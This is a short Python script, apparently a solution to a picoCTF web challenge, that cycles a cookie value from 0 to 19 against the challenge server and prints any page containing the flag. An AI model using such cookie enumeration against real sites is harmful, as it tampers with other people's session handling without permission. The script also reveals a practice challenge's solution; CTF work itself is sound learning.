import requests

for i in range(0,20):
    cookies = dict(name=str(i))
    res = requests.get('http://mercury.picoctf.net:21485/',cookies=cookies)
    if 'picoCTF' in res.text:
        print(res.text)